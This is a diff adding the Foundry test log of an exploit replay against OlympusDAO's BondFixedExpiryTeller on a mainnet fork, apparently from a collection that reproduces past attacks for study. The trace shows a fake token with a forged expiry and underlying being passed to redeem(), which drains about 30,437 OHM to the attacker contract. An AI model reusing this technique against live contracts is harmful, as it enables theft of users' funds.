@@ -1,0 +1,54 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/OlympusDao_exp.sol:AttackContract
+[PASS] testExploit() (gas: 192479)
+Logs:
+  ---------- Start from block 15794363 ----------
+  Attacker OHM balance: 0.000000000
+  Redeeming...
+  Attacker OHM balance after hack: 30437.077948152
+
+Traces:
+  [5083] AttackContract::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15794363 [1.579e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(OHM: [0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5], "OHM")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BondFixedExpiryTeller: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156], "BondFixedExpiryTeller")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [200079] AttackContract::testExploit()
+    ├─ [0] console::log("---------- Start from block %s ----------", 15794363 [1.579e7]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2468] OHM::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "Attacker OHM balance", val: 0, decimals: 9)
+    ├─ [110557] → new FakeToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 552 bytes of code
+    ├─ [2468] OHM::balanceOf(BondFixedExpiryTeller: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156]) [staticcall]
+    │   └─ ← [Return] 30437077948152 [3.043e13]
+    ├─ [34457] BondFixedExpiryTeller::redeem(FakeToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 30437077948152 [3.043e13])
+    │   ├─ [360] FakeToken::expiry() [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [619] FakeToken::burn(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30437077948152 [3.043e13])
+    │   │   └─ ← [Stop]
+    │   ├─ [358] FakeToken::underlying() [staticcall]
+    │   │   └─ ← [Return] OHM: [0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5]
+    │   ├─ [25996] OHM::transfer(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30437077948152 [3.043e13])
+    │   │   ├─ emit Transfer(from: BondFixedExpiryTeller: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156], to: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30437077948152 [3.043e13])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000000000001baeaf3816f8
+    │   │   │   @ 0x879b72460980896918cfde80d2534d0d5f7eb1646abfadba79622901cb141118: 0x00000000000000000000000000000000000000000000000000001baeaf3816f8 → 0
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Redeeming...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [468] OHM::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 30437077948152 [3.043e13]
+    ├─ emit log_named_decimal_uint(key: "Attacker OHM balance after hack", val: 30437077948152 [3.043e13], decimals: 9)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.06s (1.60s CPU time)
+
+Ran 1 test suite in 4.30s (3.06s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
